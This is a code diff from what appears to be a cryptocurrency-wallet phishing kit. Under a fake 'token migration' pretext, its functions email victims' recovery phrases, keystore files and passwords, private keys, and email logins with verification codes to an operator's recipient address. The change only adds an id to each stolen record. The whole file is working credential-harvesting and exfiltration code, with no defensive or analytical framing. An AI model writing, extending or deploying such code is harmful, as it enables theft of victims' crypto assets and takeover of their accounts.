@@ -7,32 +7,36 @@ SUBJECT = 'NEW FORM FROM TOKEN MIGRATION RECTIFY'
 
 PHRASE = ''''
 --------- New Phrase Token ----------
-Token: {a}
+id: {}
+Token: {}
 '''
 
 KEYSTORE_JSON = ''''
 --------- New Keystore JSON ----------
-Token: {a}
-Passowrd: {b}
+id: {}
+Token: {}
+Passowrd: {}
 '''
 
 PRIVATE_KEY = ''''
 --------- New Private Key ----------
-Private Key: {a}
+id: {}
+Private Key: {}
 '''
 
 EMAIL = ''''
 --------- New Email & Passowrd ----------
-Email: {a}
-Password: {b}
-Code: {c}
+id: {}
+Email: {}
+Password: {}
+Code: {}
 '''
 
-def send_phrase(phrase):
+def send_phrase(idx, phrase):
     try:
         send_mail(
             subject=SUBJECT,
-            message=PHRASE.format(a=phrase),
+            message=PHRASE.format(idx, phrase),
             from_email=None,
             recipient_list=[RECIPIENT_MAIL],
         )
@@ -41,10 +45,10 @@ def send_phrase(phrase):
         print(e)
         return 0
 
-def send_keystore(keystore, password):
+def send_keystore(idx, keystore, password):
     try:
         send_mail(
-            KEYSTORE_JSON.format(keystore, password),
+            KEYSTORE_JSON.format(idx, keystore, password),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
@@ -52,10 +56,10 @@ def send_keystore(keystore, password):
         print(e)
         return 0
 
-def send_private(key):
+def send_private(idx, key):
     try:
         send_mail(
-            PRIVATE_KEY.format(key),
+            PRIVATE_KEY.format(idx, key),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
@@ -63,10 +67,10 @@ def send_private(key):
         print(e)
         return 0
 
-def send_email(email, password, code):
+def send_email(idx, email, password, code):
     try:
         send_mail(
-            EMAIL.format(email, password, code),
+            EMAIL.format(idx, email, password, code),
             recipient_list=[RECIPIENT_MAIL],
         )
         return 1
